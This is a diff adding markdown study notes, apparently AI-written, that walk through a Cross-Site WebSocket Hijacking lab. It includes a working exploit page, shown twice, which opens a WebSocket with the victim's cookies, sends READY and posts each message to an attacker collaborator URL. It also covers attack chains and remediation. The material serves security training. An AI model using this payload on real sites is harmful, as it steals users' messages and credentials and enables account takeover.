@@ -257,7 +257,316 @@ If you want next, I can give you:
 
 ---
 
-# 🧠Lab-2 WEBSOCKETS XSS WITH FILTER BYPASS + HANDSHAKE MANIPULATION — COMPLETE NOTES
+# 🧠 Lab-2 CROSS-SITE WEBSOCKET HIJACKING (CSWSH) — COMPLETE NOTES
+
+## 📌 1️⃣ OVERVIEW
+
+This lab demonstrates a Cross-Site WebSocket Hijacking (CSWSH) attack where:
+
+- The attacker tricks a victim into opening a malicious page
+- That page silently creates a WebSocket connection to the target site
+- The victim’s session cookies are automatically included
+- The attacker retrieves sensitive chat history
+- Credentials are leaked → Account takeover
+
+## 📌 2️⃣ WHAT IS THIS TOPIC? (CSWSH)
+
+### 🔴 Definition:
+
+Cross-Site WebSocket Hijacking = abusing WebSocket connections without proper authentication or origin validation
+
+### 🧠 Core idea:
+
+Browser allows WebSocket connections cross-origin → cookies auto-attach → server trusts it → attacker hijacks session
+
+## 📌 3️⃣ LAB WALKTHROUGH (STEP-BY-STEP)
+
+### 🟢 Step 1 — Generate WebSocket traffic
+
+Open lab
+
+Click Live chat
+
+Send:
+
+```text
+hello
+```
+
+### 🟢 Step 2 — Identify sensitive command
+
+Go to:
+
+```text
+Proxy → WebSockets history
+```
+
+Find:
+
+```text
+READY
+```
+
+### 🧠 Meaning:
+
+READY command retrieves full chat history
+
+### 🟢 Step 3 — Capture WebSocket URL
+
+Go to:
+
+```text
+Proxy → HTTP history
+```
+
+Find handshake:
+
+```http
+GET /chat HTTP/1.1
+Upgrade: websocket
+```
+
+Copy URL:
+
+```text
+https://YOUR-LAB-ID.web-security-academy.net/chat
+```
+
+Convert:
+
+```text
+wss://YOUR-LAB-ID.web-security-academy.net/chat
+```
+
+### 🟢 Step 4 — Create exploit (Exploit Server)
+
+```html
+<script>
+var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
+
+ws.onopen = function() {
+    ws.send("READY");
+};
+
+ws.onmessage = function(event) {
+    fetch('https://YOUR-COLLABORATOR-URL', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: event.data
+    });
+};
+</script>
+```
+
+### 🟢 Step 5 — Add Collaborator
+
+Go to Burp → Collaborator
+
+Copy URL
+
+Replace in payload
+
+### 🟢 Step 6 — Test exploit
+
+Click View exploit
+
+Poll Collaborator
+
+👉 You will see:
+
+```text
+Chat messages exfiltrated
+```
+
+### 🟢 Step 7 — Deliver to victim
+
+Click Deliver exploit to victim
+
+Poll Collaborator again
+
+👉 You get:
+
+```text
+Victim chat history
+→ Contains username & password
+```
+
+### 🟢 Step 8 — Login
+
+Use stolen credentials → Lab solved ✅
+
+## 📌 4️⃣ FINAL PAYLOAD
+
+```html
+<script>
+var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
+
+ws.onopen = function() {
+    ws.send("READY");
+};
+
+ws.onmessage = function(event) {
+    fetch('https://YOUR-COLLABORATOR-URL', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: event.data
+    });
+};
+</script>
+```
+
+## 📌 5️⃣ PAYLOAD BREAKDOWN
+
+### 🔹 `new WebSocket(...)`
+
+Creates connection to target using victim session
+
+### 🔹 `ws.onopen`
+
+Triggered when connection is established
+
+```javascript
+ws.send("READY");
+```
+
+👉 Forces server to send chat history
+
+### 🔹 `ws.onmessage`
+
+Triggered when server sends data
+
+```javascript
+fetch(...)
+```
+
+👉 Sends stolen data to attacker server
+
+### 🔹 `mode: no-cors`
+
+Bypasses browser CORS restrictions silently
+
+## 📌 6️⃣ REAL-WORLD SCENARIOS (100% Practical)
+
+### 🔴 Scenario 1 — Customer Support Chat
+
+- User chats with support
+- Credentials or tokens appear in messages
+- Attacker steals full chat → account takeover
+
+### 🔴 Scenario 2 — Admin Dashboards
+
+- Admin panels using WebSockets
+- Logs / alerts streamed
+- Attacker hijacks → gets sensitive data
+
+### 🔴 Scenario 3 — Trading / Crypto Platforms
+
+- Real-time updates via WebSockets
+- Attacker hijacks → steals transaction data
+
+### 🔴 Scenario 4 — Internal Tools
+
+- Employee chat systems
+- Internal messages leaked
+
+## 📌 7️⃣ VARIATIONS OF ATTACK
+
+### 🔹 1. Silent Data Exfiltration
+
+Steal messages without user knowing
+
+### 🔹 2. Active Injection
+
+Send malicious messages via `ws.send()`
+
+### 🔹 3. Token Leakage
+
+Extract JWT/session tokens from messages
+
+### 🔹 4. Persistent Monitoring
+
+Keep connection open → real-time spying
+
+## 📌 8️⃣ MULTI-CHAIN ATTACK POSSIBILITIES
+
+### 🔗 Chain 1 — CSWSH → Credential Theft → Account Takeover
+
+### 🔗 Chain 2 — CSWSH → XSS Payload Injection
+
+### 🔗 Chain 3 — CSWSH → Admin Access → Full System Compromise
+
+### 🔗 Chain 4 — CSWSH + Clickjacking
+
+- Trick victim to open exploit page
+- Auto-run WebSocket hijack
+
+## 📌 9️⃣ ROOT CAUSE (WHY IT WORKS)
+
+### ❌ No Origin Validation
+
+Server does not check request origin
+
+### ❌ No CSRF Protection
+
+WebSocket handshake has no CSRF token
+
+### ❌ Cookies Auto-Sent
+
+Browser sends session cookies automatically
+
+### ❌ Dangerous Commands
+
+`READY` exposes full chat history
+
+## 📌 🔟 REMEDIATION (DEFENSE)
+
+### 🟢 1. Validate Origin Header
+
+```http
+Origin: https://trusted-site.com
+```
+
+Reject others.
+
+### 🟢 2. Use CSRF Tokens in Handshake
+
+Require token before allowing WebSocket actions
+
+### 🟢 3. Authentication per Message
+
+Do not trust connection alone
+
+### 🟢 4. Restrict Sensitive Commands
+
+`READY` should require authorization
+
+### 🟢 5. SameSite Cookies
+
+```http
+Set-Cookie: session=xyz; SameSite=Strict
+```
+
+## 📌 1️⃣1️⃣ MENTAL MODEL (VERY IMPORTANT)
+
+```text
+Victim browser = your proxy
+WebSocket = tunnel
+READY = data dump trigger
+fetch() = data exfiltration
+```
+
+## 🔥 FINAL ONE-LINE SUMMARY
+
+You trick the victim’s browser into opening a WebSocket connection and force it to leak sensitive data to you.
+
+If you want next, I can:
+
+👉 compare **CSRF vs CSWSH vs Clickjacking (very important exam concept)**  
+👉 or give you **real bug bounty examples where this exact attack was used**
+
+---
+
+# 🧠Lab-3 WEBSOCKETS XSS WITH FILTER BYPASS + HANDSHAKE MANIPULATION — COMPLETE NOTES
 
 ## 📌 1️⃣ OVERVIEW
 
